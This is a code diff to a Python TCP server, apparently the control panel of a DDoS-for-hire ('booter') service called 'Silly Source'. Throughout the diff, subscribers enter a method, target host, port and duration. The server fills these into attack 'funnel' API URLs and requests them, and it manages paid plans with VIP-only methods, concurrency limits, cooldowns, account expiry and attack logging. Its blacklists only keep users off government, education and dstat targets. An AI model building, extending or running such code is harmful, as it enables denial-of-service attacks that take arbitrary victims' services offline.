@@ -2,16 +2,37 @@ import socket
 import json
 import time
 import random
+from sys import argv
 from requests import get
 from threading import Thread
 from datetime import datetime, timedelta
 
+DEBUG = False
+
+if len(argv) == 1:
+	print(f"Running normally, for debug mode do\npython3 {argv[0]} debug\r\n\r\n")
+elif argv[1] in ("debug", "Debug"):
+	DEBUG = True
+
 # Load config and set the data as a CONSTANT
+if DEBUG:
+	print("[Silly Source] Loading CONFIG")
 with open("config.json", "r") as f:
 	try:
 		CFG = json.load(f)
 	except Exception as e:
 		exit(f"[{e}] Your config.json file is formatted inproperly or doesn't exist.")
+
+if DEBUG:
+	print("[Silly Source] Successfully Loaded CONFIG")
+	if CFG["logging"]["enabled"]:
+		LOGGING = True
+		print("[Silly Source] Logging is enabled, you can disable it in config.json")
+	else:
+		LOGGING = False
+		print("[Silly Source] Logging is disabled, you can enable it in config.json")
+
+	print("[Silly Source] Loading LOGINS")
 
 with open("logins.json", "r") as f:
 	try:
@@ -19,17 +40,30 @@ with open("logins.json", "r") as f:
 	except Exception as e:
 		exit(f"[{e}] Your logins.json file is formatted inproperly or doesn't exist")
 
+if DEBUG:
+	print("[Silly Source] Successfully Loaded LOGINS")
+	print("[Silly Source] Loading METHODS")
+
 with open("methods.json", "r") as f:
 	try:
 		METHODS = json.loads(f.read())
 	except Exception as e:
 		exit(f"[{e}] Your methods.json file is formatted inproperly or doesn't exist")
 
+if DEBUG:
+	print("[Silly Source] Successfully Loaded METHODS")
+	print("[Silly Source] Loading BLACKLISTED")
+
 with open("blacklisted.json", "r") as f:
 	try:
 		BLACKLISTED = json.load(f)
 	except Exception as e:
 		exit(f"[{e}] Your methods.json file is formatted inproperly or doesn't exist")
+
+if DEBUG:
+	print("[Silly Source] Successfully Loaded BLACKLISTED")
+	print("[Silly Source] SuccessfullyLoaded All Databases")
+	print("[Silly Source] Starting Server...")
 
 ongoing = {
 	"running_amount": 0,
@@ -46,6 +80,7 @@ class Tools:
 	global LOGINS
 	global ongoing
 	global cooldown
+	global LOGGING
 	def __init__(self) -> None:
 		...
 
@@ -191,11 +226,11 @@ class Tools:
 		except KeyError:
 			ongoing[user] = {"running":1}
 		
-		ongoing["info"].append(f"{atk_id} {user} {method} {ip} {port} {atk_time} {length_remaining}")
+		ongoing["info"].append(f"  {atk_id}    {user}      {method}      {ip}    {port}     {atk_time}     {length_remaining}")
 
 		for _ in range(int(atk_time)):
 			time.sleep(1)
-			ongoing["info"] = [item.replace(f"{atk_id} {user} {method} {ip} {port} {atk_time} {length_remaining}", f"{atk_id} {user} {method} {ip} {port} {atk_time} {length_remaining - 1}")  for item in ongoing["info"]]
+			ongoing["info"] = [item.replace(f"  {atk_id}    {user}      {method}      {ip}    {port}     {atk_time}     {length_remaining}", f"  {atk_id}    {user}      {method}      {ip}    {port}     {atk_time}     {length_remaining - 1}")  for item in ongoing["info"]]
 			length_remaining -= 1
 
 		ongoing[user]["running"] -= 1
@@ -217,7 +252,7 @@ class Tools:
 		del cooldown[username]
 
 	@staticmethod
-	def add_new(user, passwrd, timelimit, concurrents, cooldown, admin, expiry):
+	def add_new(user, passwrd, timelimit, concurrents, cooldown, admin, expiry, vip):
 		current_date = datetime.now()
 		expiration_date = current_date + timedelta(days=int(expiry))
 
@@ -227,6 +262,7 @@ class Tools:
 			"concurrents": concurrents,
 			"timelimit": timelimit,
 			"cooldown": cooldown,
+			"vip": True if vip in ('y', 'Y') else False,
 			"logged_in": False,
 			"expiry": expiration_date.strftime('%Y-%m-%d')
 		}
@@ -260,11 +296,27 @@ class Tools:
 						sock.send(f'Syntax: {parsed[0]} host port time\r\nExample: {parsed[0]} 1.1.1.1 80 30\n'.encode())
 					else:
 						if parsed[1] in BLACKLISTED["stupid"]:
+							if LOGGING:
+								with open("logs/stupid.txt", "a") as f:
+									f.write(f"{username} {parsed[1]} {parsed[2]} {parsed[3]} {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\r\n")
+								if DEBUG:
+									print(f"[Silly Source] Attack has been blocked from {username}, it has been logged in stupid.txt")
 							sock.send(f'why are you trying to hit {parsed[1]} you fucking idiot\r\n'.encode())
 						elif parsed[1] in BLACKLISTED["gov"]:
-							sock.send(f'\r\nYou cant hit govs/edus\r\n'.encode())
+							if LOGGING:
+								with open("logs/blacklisted.txt", "a") as f:
+									f.write(f"{username} {parsed[1]} {parsed[2]} {parsed[3]} {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\r\n")
+								if DEBUG:
+									print(f"[Silly Source] Attack has been blocked from {username}, it has been logged in blacklisted.txt")
+							sock.send(f'You cant hit govs/edus\r\n'.encode())
 						elif parsed[1] in BLACKLISTED["dstat"]:
-							sock.send(f'\r\nYou cant hit dstats\r\n'.encode())
+							if LOGGING:
+								with open("logs/dstat.txt", "a") as f:
+									f.write(f"{username} {parsed[1]} {parsed[2]} {parsed[3]} {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\r\n")
+								if DEBUG:
+									print(f"[Silly Source] Attack has been blocked from {username}, it has been logged in dstat.txt")
+							
+							sock.send(f'You cant hit dstats\r\n'.encode())
 						else:
 							if CFG["main"]["max_global_slots"] == ongoing["running_amount"]:
 								sock.send(f'Sorry, max slots of {CFG["main"]["max_global_slots"]} are full.\r\n'.encode())
@@ -285,19 +337,67 @@ class Tools:
 											if cooldown[username] != -1:
 												sock.send(f'You are on cooldown for {cooldown[username]} more seconds\r\n'.encode())
 										except:
-											Thread(target=Tools().concurrents_handler, args=((parsed[0], parsed[1], parsed[2], parsed[3], username),)).start()
-											Thread(target=Tools().handle_cooldown, args=((username),)).start()
-											sock.send(b'Attack sent.\r\n')
+											if METHODS[parsed[0]]["vip_only"] and not LOGINS[username]["vip"]:
+												sock.send(b'You need to be VIP to use this method\r\n')
+											else:
+												if LOGGING:
+													with open("logs/attacks.txt", "a") as f:
+														f.write(f"{username} {parsed[1]} {parsed[2]} {parsed[3]} {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\r\n")
+													if DEBUG:
+														print(f"[Silly Source] Attack has been launched by {username}, it has been logged in attacks.txt")
+												Thread(target=Tools().concurrents_handler, args=((parsed[0], parsed[1], parsed[2], parsed[3], username),)).start()
+												Thread(target=Tools().handle_cooldown, args=((username),)).start()
+												apis = METHODS[parsed[0]]["funnels"]
+												formatted_api = []
+												for api in apis:
+													formatted_api.append(api.replace("(HOST)", parsed[1]).replace("(PORT)", parsed[2]).replace("(TIME)", parsed[3]))
+
+												for api in formatted_api:
+													try:
+														resp = get(api)
+														domain = api.split("https://")[1].split("/")[0]
+													except Exception as e:
+														if DEBUG:
+															print(f"[Silly Source] {domain} RETURNED ERROR {e}")
+													else:
+														if DEBUG:
+															print(f"[Silly Source] {domain} Returned status code {resp.status_code}")
+															print(f"[Silly Source] {domain} Returned JSON {resp.json}")
+												sock.send(b'Attack sent.\r\n')
 								except Exception as e:
 									print(e)
 									try:
 										if cooldown[username] != -1:
 											sock.send(f'You are on cooldown for {cooldown[username]} more seconds\r\n'.encode())
 									except:
-										Thread(target=Tools().concurrents_handler, args=((parsed[0], parsed[1], parsed[2], parsed[3], username),)).start()
-										Thread(target=Tools().handle_cooldown, args=((username),)).start()
-										sock.send(b'Attack sent.\r\n')
-				except Exception as e:
+										if METHODS[parsed[0]]["vip_only"] and not LOGINS[username]["vip"]:
+											sock.send(b'You need to be VIP to use this method\r\n')
+										else:
+											if LOGGING:
+												with open("logs/attacks.txt", "a") as f:
+													f.write(f"{username} {parsed[1]} {parsed[2]} {parsed[3]} {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\r\n")
+												if DEBUG:
+													print(f"[Silly Source] Attack has been launched by {username}, it has been logged in attacks.txt")
+											apis = METHODS[parsed[0]]["funnels"]
+											formatted_api = []
+											for api in apis:
+												formatted_api.append(api.replace("(HOST)", parsed[1]).replace("(PORT)", parsed[2]).replace("(TIME)", parsed[3]))
+
+											for api in formatted_api:
+												try:
+													resp = get(api)
+													domain = api.split("https://")[1].split("/")[0]
+												except Exception as e:
+													if DEBUG:
+														print(f"[Silly Source] {domain} RETURNED ERROR {e}")
+												else:
+													if DEBUG:
+														print(f"[Silly Source] {domain} Returned status code {resp.status_code}")
+														print(f"[Silly Source] {domain} Returned JSON {resp.json}")
+											Thread(target=Tools().concurrents_handler, args=((parsed[0], parsed[1], parsed[2], parsed[3], username),)).start()
+											Thread(target=Tools().handle_cooldown, args=((username),)).start()
+											sock.send(b'Attack sent.\r\n')
+				except:
 					if cmd in ("clear", "cls"):
 						Tools().clear(sock)
 					elif cmd == "ongoing":
@@ -305,7 +405,7 @@ class Tools:
 							sock.send("No attacks ongoing right now.\n".encode())
 						else:
 							formatted_list = '\r\n'.join(f"{x}" for x in ongoing["info"])
-							sock.send(f"Showing {ongoing['running_amount']} Running attacks.\r\n{formatted_list}\r\n".encode())
+							sock.send(f"Showing {ongoing['running_amount']} Running attacks.\r\n\r\n|--ID--|--USER--|--METHOD--|--HOST--|--PORT--|--TIME--|--REMAINING--|\r\n{formatted_list}\r\n".encode())
 					elif cmd == "add":
 						if LOGINS[username]["admin"]:
 							sock.send(f'Username: '.encode())
@@ -318,18 +418,25 @@ class Tools:
 							timelimit = sock.recv(1024).decode().replace("\r\n", "")
 							sock.send(f'Cooldown: '.encode())
 							cooldown = sock.recv(1024).decode().replace("\r\n", "")
+							sock.send(f'VIP(y/n): '.encode())
+							vip = sock.recv(1024).decode().replace("\r\n", "")
 							sock.send(f'Admin(y/n): '.encode())
 							admin = sock.recv(1024).decode().replace("\r\n", "")
 							sock.send(b'Expiry(in days): ')
 							expiry = sock.recv(1024).decode().replace("\r\n", "")
 
-							Tools().add_new(user, passwrd, timelimit, concurrents, cooldown, admin, expiry)
+							Tools().add_new(user, passwrd, timelimit, concurrents, cooldown, admin, expiry, vip)
 						else:
 							sock.send(b'Yo bitch ass aint no admin')
 
+					elif cmd in ("myinfo", "plan"):
+						Tools().clear(sock)
+						info = LOGINS[username]
+						sock.send(f'\r\nUsername: {username}\r\nAdmin: {info["admin"]}\r\nConcurrents: {info["concurrents"]}\r\nTimelimit: {info["timelimit"]}\r\nCooldown: {info["cooldown"]}\r\nExpiry: {info["expiry"]}\r\nVIP: {info["vip"]}\r\n'.encode())
+
 					elif cmd == "update":
 						if LOGINS[username]["admin"]:
-							sock.send(f'password - change a users password\r\nadmin - set a users admin status to true/false\r\nconcurrents - set a users concurrents\r\ntimelimit - set a users timelimit\r\ncooldown - set a users cooldown\r\nexpiry - set a users exipre date\r\n\r\nWhat would you like to update: '.encode())
+							sock.send(f'vip - set a users vip status to true/false\r\npassword - change a users password\r\nadmin - set a users admin status to true/false\r\nconcurrents - set a users concurrents\r\ntimelimit - set a users timelimit\r\ncooldown - set a users cooldown\r\nexpiry - set a users exipre date\r\n\r\nWhat would you like to update: '.encode())
 							answ = sock.recv(1024).decode().replace("\r\n", "")
 							sock.send(b'Username: ')
 							change_usr = sock.recv(1024).decode().replace("\r\n", "")
@@ -346,6 +453,14 @@ class Tools:
 									with open('logins.json', 'w') as file:
 										json.dump(LOGINS, file, indent=4)
 
+									sock.send(b'Updated.\r\n')
+
+								elif answ in ("vip", "Vip", "VIP"):
+									sock.send(b'Should they be VIP(y/n): ')
+									response = sock.recv(1024).decode().replace("\r\n", "")
+									LOGINS[change_usr]["vip"] = True if response in ("y", "Y", "yes", "Yes") else False
+									with open('logins.json', 'w') as file:
+										json.dump(LOGINS, file, indent=4)
 									sock.send(b'Updated.\r\n')
 								
 								elif answ in ("Admin", "admin"):
@@ -425,10 +540,14 @@ def main() -> None:
 		s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
 		s.bind(('0.0.0.0', CFG["main"]["server_port"]))
 		s.listen(999)
+		if DEBUG:
+			print(f"[Silly Source] Starting server on tcp port {CFG['main']['server_port']} (This can be modified in config.json)")
 	except Exception as e:
 		exit(f"[{e}] Error binding server, make sure the tcp port specified in your config isn't already running something and make sure server_port is in your config.")
 
-	print("Server binded.")
+	print("[Silly Source] Server Started.")
+	if DEBUG:
+		print("[Silly Source] Waiting for clients...")
 
 	while True:
 		sock, recv_addr = s.accept()
